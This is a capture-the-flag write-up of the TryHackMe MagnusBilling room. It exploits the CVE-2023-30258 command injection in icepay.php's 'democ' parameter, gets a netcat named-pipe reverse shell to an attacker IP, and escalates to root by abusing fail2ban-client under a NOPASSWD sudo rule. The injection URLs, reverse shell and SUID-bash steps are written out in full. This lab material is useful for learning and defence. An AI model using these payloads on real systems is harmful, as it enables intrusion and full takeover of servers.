---
title: "MagnusBilling — Writeup"
date: 2026-11-25
categories: [ctf, tryhackme]
tags: [linux, web-exploitation, privilege-escalation]
---

# MagnusBilling — Writeup

**TryHackMe Room:** https://tryhackme.com/room/billing
**Target:** `10.129.189.204`
**Category:** Linux / Web Application Exploitation / Privilege Escalation

## Overview

This box hosts a MagnusBilling VoIP billing application built on top of Asterisk. The path to root involves discovering the exact application version through an exposed `README.md`, identifying a known unauthenticated command injection vulnerability (CVE-2023-30258), using it to gain an initial foothold as the `asterisk` user, and then abusing a misconfigured `sudo` rule on `fail2ban-client` to escalate to root.

---

## 1. Reconnaissance

A full TCP port scan was run against the target to identify all open services:

```bash
nmap -T4 -n -sC -sV -Pn -p- -oN scan.txt 10.129.189.204
```

**Results:**

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
80/tcp   open  http     Apache httpd 2.4.62 ((Debian))
| http-title:             MagnusBilling
|_Requested resource was http://10.129.189.204/mbilling/
|_http-server-header: Apache/2.4.62 (Debian)
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
```

**Interpretation:**

| Port | Service | Relevance |
|------|---------|-----------|
| 22   | OpenSSH 9.2p1 | Likely only useful once valid credentials or SSH keys are obtained |
| 80   | Apache / MagnusBilling | Primary attack surface — a web application with a history of CVEs |
| 3306 | MariaDB | Backend database for MagnusBilling; likely only reachable locally or post-compromise |
| 5038 | Asterisk Call Manager (AMI) | Management interface for the underlying Asterisk PBX that MagnusBilling sits on top of |

The scan confirms a classic "web billing panel on top of a VoIP/PBX stack" setup, with port 80 as the obvious entry point.

---

## 2. Web Enumeration — Identifying the MagnusBilling Version

Browsing to `http://10.129.189.204/mbilling/` loads the MagnusBilling login panel, but the page itself gives no explicit version number.

Since MagnusBilling is an open-source project, its GitHub repository structure was used as a reference for files that are commonly left behind in a production deployment (because the entire repo is often cloned or extracted straight into the webroot). This includes files such as `README.md`, `CHANGELOG.md`, and `composer.json` that are never meant to be served but end up web-accessible anyway.

Requesting the repository's root-level `README.md` directly confirmed this:

```
http://10.129.189.204/mbilling/README.md
```

The file was served in full and disclosed the exact version:

```
###############
MagnusBilling 7
###############

# MagnusBilling 7
Voip sistem to Asterisk.
...
## Versioning
We are in MagnusBilling version 7.x.x
```

This single misconfiguration — deploying the application with its development/repo files still intact in the webroot — was enough to fingerprint the software precisely, without needing to brute-force the directory structure.

---

## 3. Vulnerability Research — CVE-2023-30258

With the version confirmed as **MagnusBilling 7**, a search for public vulnerabilities led to **CVE-2023-30258**, a security advisory describing the following:

> A command injection vulnerability exists in magnusbilling versions 6 and 7. The vulnerability allows an unauthenticated user to execute arbitrary OS commands on the host, with the privileges of the web server.

**Affected products:**
- MagnusBilling 7, up to and including commit `7af21ed620`
- MagnusBilling 6 (all versions)

**Vulnerable component:**
The vulnerability lives in `lib/icepay/icepay.php`, in a block of leftover demonstration code that calls PHP's `exec()` at line 753. The `democ` GET parameter is passed directly into `exec()` without sanitization:

```php
if (isset($_GET['democ'])) {
    if (strlen($_GET['democ']) > 5) {
        exec("touch " . $_GET['democ'] . '.txt');
    } else {
        exec("rm -rf *.txt");
    }
}
```

Because the `democ` value is concatenated straight into a shell command, an attacker can break out of the intended `touch` command using a semicolon (`;`) to chain in arbitrary additional commands.

**Impact:** An unauthenticated attacker can execute arbitrary OS commands as the web server user (typically `www-data` or, in this case, `asterisk`), compromising the billing system and its database.

**Proposed PoC (from the advisory):** use a harmless `sleep` command as a time-based proof of concept:

```
/mbilling/lib/icepay/icepay.php?democ=/dev/null;sleep%2030;ls%20a
```

A 30-second delay in the response confirms the injected command is executed.

---

## 4. Exploitation

### 4.1 Confirming the Injection (Time-Based PoC)

To validate the vulnerability safely before attempting code execution, timed requests were sent using `curl`, measuring response time with `sleep` as the injected payload.

**Sleep 2:**
```bash
time curl -s 'http://10.129.189.204/mbilling/lib/icepay/icepay.php?democ=;sleep+2;'
```
```
real    0m2.568s
```

**Sleep 5:**
```bash
time curl -s 'http://10.129.189.204/mbilling/lib/icepay/icepay.php?democ=;sleep+5;'
```
```
real    0m5.541s
```

The response time scaling directly with the injected `sleep` value confirms that arbitrary commands are indeed being executed on the server via the `democ` parameter. This validates CVE-2023-30258 against the target.

### 4.2 Gaining a Reverse Shell

With command injection confirmed, the next step was to turn it into an interactive shell. A `curl` request was crafted using `--data-urlencode` to safely URL-encode the payload, injecting a classic named-pipe reverse shell:

```bash
curl 'http://10.129.189.204/mbilling/lib/icepay/icepay.php' \
  --get --data-urlencode 'democ=;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.129.132 443 >/tmp/f;'
```

**How this payload works:**
1. `rm /tmp/f` — removes any pre-existing named pipe to avoid conflicts.
2. `mkfifo /tmp/f` — creates a new named pipe (FIFO) at `/tmp/f`.
3. `cat /tmp/f | sh -i 2>&1 | nc <attacker_ip> 443 > /tmp/f` — pipes an interactive shell's input/output through the FIFO and out over netcat to the attacker's listener on port 443.

A netcat listener was set up on the attacker machine beforehand to catch the callback:

```bash
nc -lvnp 443
```

**Result:**
```
Listening on 0.0.0.0 443
Connection received on 10.129.189.204 34596
$ whoami
asterisk
$ id
uid=1001(asterisk) gid=1001(asterisk) groups=1001(asterisk)
```

A shell was successfully obtained as the `asterisk` user, and a directory listing of the current working directory (`lib/icepay/`) confirmed the foothold landed inside the vulnerable MagnusBilling application path, alongside the other `icepay-*.php` payment gateway files.

### 4.3 Stabilizing the Shell

The initial reverse shell is a raw, non-interactive `sh` session. It was upgraded to a fully interactive TTY using the standard Python PTY trick:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash");'
```

Followed by backgrounding the shell and fixing terminal settings on the attacker side:

```bash
stty raw -echo; fg
```

This provides tab-completion, command history, and proper handling of control characters (e.g., `Ctrl+C`) for a much more usable working shell.

---

## 5. User Flag

With a stable shell as `asterisk`, the user flag was located and read:

```bash
asterisk@ip-10-129-189-204:/var/www/html/mbilling/lib/icepay$ cat /home/magnus/user.txt
[REDACTED]
```

---

## 6. Privilege Escalation Enumeration

Standard privilege escalation enumeration began with checking the current user's `sudo` permissions:

```bash
sudo -l
```

**Output:**
```
Matching Defaults entries for asterisk on ip-10-129-189-204:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for asterisk:
    Defaults!/usr/bin/fail2ban-client !requiretty

User asterisk may run the following commands on ip-10-129-189-204:
    (ALL) NOPASSWD: /usr/bin/fail2ban-client
```

This reveals that the `asterisk` user can run `/usr/bin/fail2ban-client` as **any user, with no password required**, and the `!requiretty` default removes the usual TTY requirement for this command — making it fully usable from a non-interactive or reverse shell session.

**Why this matters:** `fail2ban-client` is used to manage the `fail2ban` intrusion-prevention service, which runs as **root** (since it needs to manipulate firewall rules such as `iptables`/`nftables`). Critically, `fail2ban-client` allows configuring custom **actions** — arbitrary shell commands that fail2ban executes automatically when a ban event occurs. Since fail2ban itself runs as root, any action command configured through `fail2ban-client` also executes with root privileges.

To find a jail to target, the current jail list was checked:

```bash
sudo /usr/bin/fail2ban-client status
```

**Output:**
```
Status
|- Number of jail:    8
`- Jail list:   ast-cli-attck, ast-hgc-200, asterisk-iptables, asterisk-manager, ip-blacklist, mbilling_ddos, mbilling_login, sshd
```

The `sshd` jail was selected as the target for the custom action, since it is a standard, always-present jail.

---

## 7. Privilege Escalation — fail2ban-client Abuse

The escalation was carried out in four steps, all using the NOPASSWD sudo rule on `fail2ban-client`:

**Step 1 — Register a new custom action on the `sshd` jail:**
```bash
sudo /usr/bin/fail2ban-client set sshd addaction rootshell
```

**Step 2 — Define what the action runs when a ban occurs (`actionban`):**
```bash
sudo /usr/bin/fail2ban-client set sshd action rootshell actionban "chmod +s /bin/bash"
```
This instructs fail2ban to run `chmod +s /bin/bash` — setting the SUID bit on `/bin/bash` — the moment a ban event fires on the `sshd` jail.

**Step 3 — Trigger the ban event to fire the action:**
```bash
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```
Banning a (harmless, local) IP address causes fail2ban to execute the configured `actionban` command as root.

**Step 4 — Verify the SUID bit was set:**
```bash
ls -la /bin/bash
```
```
-rwsr-sr-x 1 root root 1265648 Apr 18 2025 /bin/bash
```
The `s` in the permission string confirms `/bin/bash` is now SUID-root.

**Step 5 — Spawn a root shell:**
```bash
/bin/bash -p
```
The `-p` flag is essential here — it tells bash to preserve the effective privileges granted by the SUID bit; without it, bash would detect the privilege mismatch and automatically drop back to the real UID.

**Result:**
```
bash-5.2# whoami
root
bash-5.2# id
uid=1001(asterisk) gid=1001(asterisk) euid=0(root) egid=0(root) groups=0(root),1001(asterisk)
```

The effective UID/GID of `0(root)` confirms full root access has been achieved.

---

## 8. Root Flag

With a root shell established, the final flag was retrieved:

```bash
bash-5.2# cat /root/root.txt
[REDACTED]
```

---

## 9. Summary / Attack Chain

1. **Recon:** Nmap identified ports 22 (SSH), 80 (Apache/MagnusBilling), 3306 (MariaDB), and 5038 (Asterisk AMI).
2. **Fingerprinting:** An exposed `README.md` in the webroot (a leftover repo file) disclosed the exact software version — **MagnusBilling 7**.
3. **Vulnerability identification:** This version matched **CVE-2023-30258**, an unauthenticated command injection in `lib/icepay/icepay.php` via the `democ` GET parameter.
4. **Validation:** Time-based `sleep` payloads confirmed the injection was live.
5. **Exploitation:** A named-pipe reverse shell payload was injected via the `democ` parameter, granting a shell as `asterisk`.
6. **Shell stabilization:** Python PTY spawn + `stty raw -echo` upgraded the shell to a full TTY.
7. **User flag:** Retrieved from `/home/magnus/user.txt`.
8. **Privesc enumeration:** `sudo -l` revealed NOPASSWD access to `/usr/bin/fail2ban-client`.
9. **Privilege escalation:** Abused `fail2ban-client`'s custom ban-action feature to execute `chmod +s /bin/bash` as root, then launched a SUID shell with `bash -p`.
10. **Root flag:** Retrieved from `/root/root.txt`.

---

## 10. Key Takeaways

- **Deployment hygiene matters:** Repository metadata files (`README.md`, `CHANGELOG.md`, `.git/`) should never be left in a public webroot — they can fully fingerprint software versions without any active scanning.
- **Demo/debug code is dangerous in production:** The root cause of CVE-2023-30258 was leftover demonstration code calling `exec()` on unsanitized user input — a reminder to strip example/test code before shipping.
- **Audit sudoers carefully:** Granting NOPASSWD access to service-management binaries like `fail2ban-client` is effectively equivalent to granting root, since such tools are often designed to run arbitrary configured commands with elevated privileges.
- **GTFOBins-style thinking pays off:** Any `sudo`-permitted binary should be checked against known abuse techniques (GTFOBins or similar) before assuming it's "safe" just because it isn't a shell interpreter.
